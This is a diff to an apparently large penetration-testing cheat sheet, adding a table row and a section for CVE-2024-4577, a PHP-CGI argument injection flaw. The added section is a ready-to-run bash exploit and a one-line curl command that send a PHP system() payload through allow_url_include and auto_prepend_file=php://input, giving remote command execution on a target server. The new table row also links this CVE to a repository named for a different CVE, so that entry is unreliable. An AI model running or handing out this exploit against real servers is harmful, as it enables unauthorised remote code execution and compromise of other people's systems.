@@ -405,6 +405,7 @@ Thank you for reading.
 | CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
 | CVE-2024-0582 | Ubuntu Linux Kernel io_uring LPE | https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 |
 | CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
+| CVE-2024-4577 | PHP-CGI Argument Injection Vulnerability RCE | https://github.com/0xl0k1/CVE-2012-1823 |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
@@ -5461,6 +5462,45 @@ if __name__ == '__main__':
 
 ```c
 python3 exploit.py -u http://<RHOST> -t <EMAIL> -e <EMAIL>
+```
+
+#### CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE
+
+```c
+#!/bin/bash
+
+function ctrl_c() {
+  echo -e "\n\n[!] Exiting..."
+  exit 1
+}
+
+trap ctrl_c SIGINT
+
+if [ $# -ne 2 ]; then
+    echo -e "\n[!] Usage: $0 <RHOST> \"<COMMAND>\""
+    echo -e "\nExample: $0 http://10.128.20.2 \"whoami\"\n"
+    exit 1
+fi
+
+rhost=$1
+command=$2
+
+exploit() {
+    payload="<?php system('$command'); die(); ?>"
+
+    echo
+    curl -s -X POST "$rhost/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "$payload" --connect-timeout 10
+    
+    if [ $? -ne 0 ]; then
+        echo "[!] Exploit failed!"
+    fi
+}
+
+exploit
+```
+
+```c
+$ curl -s -X POST "<RHOST>/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php system('whoami'); die(); ?>" 
 ```
 
 #### GodPotato LPE
